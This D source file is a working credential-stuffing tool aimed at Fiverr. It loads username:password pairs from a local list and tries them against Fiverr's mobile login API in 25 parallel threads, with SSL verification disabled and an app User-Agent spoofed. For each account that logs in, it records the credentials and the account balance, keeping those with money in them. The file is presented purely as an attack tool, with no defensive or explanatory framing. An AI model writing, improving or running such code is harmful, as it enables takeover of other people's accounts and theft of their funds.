module main;

import core.thread;
import etc.c.curl : CurlOption, CurlInfo;
import std.array;
import std.conv;
import std.file;
import std.net.curl;
import std.parallelism;
import std.regex;
import std.stdio;
import std.json;
import core.time;
import std.datetime;
import std.string;
import std.process;
import std.uri;
import std.json;
import std.exception;
import std.uni;
import std.random;
import core.memory;
import std.digest.md;
import std.stdio;

void run(string user, string pass)
{
	int trys = 0;
	bool done = false;
	while (!done) {
		try
		{
			writeln("Begin Checking Account! " ~ user);
			bool working = false;
			string captchatext;
			auto conn = HTTP();
			conn.handle.set(CurlOption.ssl_verifypeer, 0);
			conn.operationTimeout(dur!"seconds"(25));
			
			auto rand = uniform(99999999999999, 99999999999999999);
			conn.setCookieJar(tempDir() ~ to!string(rand));
			conn.addRequestHeader("User-Agent", "fiverr/1.50.0 (iPhone; iOS 7.1.2; Scale/2.00)");
			conn.addRequestHeader("Accept", "application/json");
			conn.addRequestHeader("Content-Type", "application/json");
			auto html = post("https://mobile.fiverr.com/api/v1/users/login", "{\"username\":\"" ~ user ~ "\",\"password\":\"" ~ pass ~ "\"}", conn);
			if (html.indexOf("No user was found") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			else if (html.indexOf("Success") != -1)
			{
				working = true;
			}
			else if (html.indexOf("Account was disabled") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}
			else
			{
				writeln("Account Does Not Work! " ~ user);
				return;
			}

			if (working)
			{
				html = get("https://mobile.fiverr.com/api/v1/users/profile", conn);
				JSONValue json = parseJSON(html);
				string balance = json["user"]["user_balance"].toString();
				writeln("Account Works! " ~ user);
				if (to!int(balance) > 0) {
					std.file.append("./Fiver Working.txt", user ~ ":" ~ pass ~ " (Balance: " ~ balance ~ ")\r\n");
				}
				return;
			}
		} catch (CurlException e) {
			writeln(e.msg);
		}
		trys += 1;
	}
}

void startRun()
{
	int threads = 25;
	auto accounts = readText("./accounts.txt").splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") == -1 && account.indexOf("+") == -1)
		{
			auto arr = split(account, ":");
			run(normalize(to!string(chomp(arr[0]))), normalize(to!string(chomp(arr[1]))));
		}
	}
}


void main(string[] args)
{
	startRun();
}

